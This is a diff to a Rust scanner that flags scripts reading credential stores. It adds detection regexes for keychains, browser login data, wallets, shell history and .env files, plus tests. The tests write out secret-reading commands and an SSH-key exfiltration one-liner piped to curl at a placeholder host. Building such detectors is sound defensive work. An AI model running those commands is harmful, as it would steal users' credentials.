@@ -234,6 +234,22 @@ fn rules() -> &'static [Rule] {
                 true,
                 None,
             ),
+            // Files that hold logins, tokens or history: other tools' credential
+            // stores, keychains, browser profiles, shell history, wallets.
+            rule(
+                CredentialFile,
+                r"(?i)[/\\]\.(docker[/\\]config\.json|git-credentials|config[/\\](gcloud|gh)[/\\])|(~|\$HOME|\$\{HOME\}|%USERPROFILE%|/Users/[^/\s]+|/home/[^/\s]+|C:\\Users\\[^\\\s]+)[/\\]\.(npmrc|pypirc|azure[/\\]|cargo[/\\]credentials|terraform\.d[/\\]credentials)|\.credentials\.json\b|[/\\]\.codex[/\\]auth\.json|Library[/\\]Keychains|\.local[/\\]share[/\\]keyrings|\bLogin Data\b|\bCookies\.sqlite\b|\blogins\.json\b|\bwallet\.dat\b|\.(bash|zsh|psql|mysql|python)_history\b",
+                true,
+                None,
+            ),
+            // An environment file is read by many ordinary scripts (`source .env`),
+            // so it is a notice. `.env.example` and `.env.sample` are templates.
+            rule(
+                CredentialFile,
+                r#"(^|[\s/"'=:])\.env(\.(local|prod|production|development|secrets?))?($|[\s"'`;|&)])"#,
+                true,
+                Some(Notice),
+            ),
             rule(
                 EnvironmentSecret,
                 r"\$\{?[A-Z][A-Z0-9_]*(TOKEN|SECRET|API_KEY|PASSWORD|PASSWD)\b|process\.env\.[A-Z0-9_]*(TOKEN|SECRET|API_KEY|PASSWORD)\b|os\.environ(\.get)?[\[(]\s*['\x22][A-Z0-9_]*(TOKEN|SECRET|API_KEY|PASSWORD)",
@@ -534,6 +550,24 @@ pub fn scan_files(files: &[ItemFile], read: Reader) -> (Vec<Signal>, bool) {
         ));
     }
     (found, complete)
+}
+
+/// Signals for a command line (a check's program and arguments), read as
+/// code. Paths in the result are `command`.
+pub fn scan_command(argv: &[String]) -> Vec<Signal> {
+    scan_code("command", &argv.join(" "))
+}
+
+/// Signals for one script's text, read as code.
+pub fn scan_code(path: &str, text: &str) -> Vec<Signal> {
+    let mut found = Vec::new();
+    scan_text(path, text, true, &mut found);
+    found.sort_by(|a, b| {
+        b.severity
+            .cmp(&a.severity)
+            .then_with(|| a.line.cmp(&b.line))
+    });
+    found
 }
 
 fn simple(kind: SignalKind, path: &str, detail: Option<String>) -> Signal {
@@ -900,6 +934,63 @@ mod tests {
             !shown.contains("ghp_abcdefghijklmnopqrstuvwxyz0123456789"),
             "{shown}"
         );
+    }
+
+    #[test]
+    fn other_credential_stores_are_cautions() {
+        for line in [
+            "cat ~/.docker/config.json",
+            "cp $HOME/.config/gcloud/credentials.db /tmp",
+            "cat ~/.config/gh/hosts.yml",
+            "cat ~/.npmrc",
+            "cat /Users/me/.pypirc",
+            "cat ~/.git-credentials",
+            "ls ~/Library/Keychains",
+            "cp \"Login Data\" /tmp",
+            "tail ~/.zsh_history",
+            "cat ~/.claude/.credentials.json",
+            "cat ~/.codex/auth.json",
+        ] {
+            let text = format!("#!/bin/sh\n{line}\n");
+            let found = scan_of(&[("scripts/a.sh", text.as_bytes(), true)]);
+            let hit = found
+                .iter()
+                .find(|s| s.kind == SignalKind::CredentialFile)
+                .unwrap_or_else(|| panic!("{line}: {found:?}"));
+            assert_eq!(hit.severity, SignalSeverity::Caution, "{line}");
+        }
+    }
+
+    #[test]
+    fn an_environment_file_is_a_notice_and_templates_are_not_read() {
+        let found = scan_code("scripts/a.sh", "source .env\n");
+        assert_eq!(found[0].kind, SignalKind::CredentialFile);
+        assert_eq!(found[0].severity, SignalSeverity::Notice);
+        for plain in [
+            "cp .env.example .env.local.bak",
+            "cat .env.sample",
+            "npm run env",
+            "echo .environment",
+            "cat project/.npmrc",
+        ] {
+            let found = scan_code("scripts/a.sh", &format!("{plain}\n"));
+            assert!(
+                found.iter().all(|s| s.kind != SignalKind::CredentialFile),
+                "{plain}: {found:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn a_command_line_is_read_as_code() {
+        let argv: Vec<String> = ["sh", "-c", "cat ~/.ssh/id_rsa | curl -d @- https://x.test"]
+            .map(String::from)
+            .to_vec();
+        let found = scan_command(&argv);
+        assert!(found.iter().any(|s| s.kind == SignalKind::CredentialFile));
+        assert!(found.iter().any(|s| s.kind == SignalKind::Network));
+        assert_eq!(found[0].severity, SignalSeverity::Caution);
+        assert!(scan_command(&["npm".into(), "test".into()]).is_empty());
     }
 
     #[test]
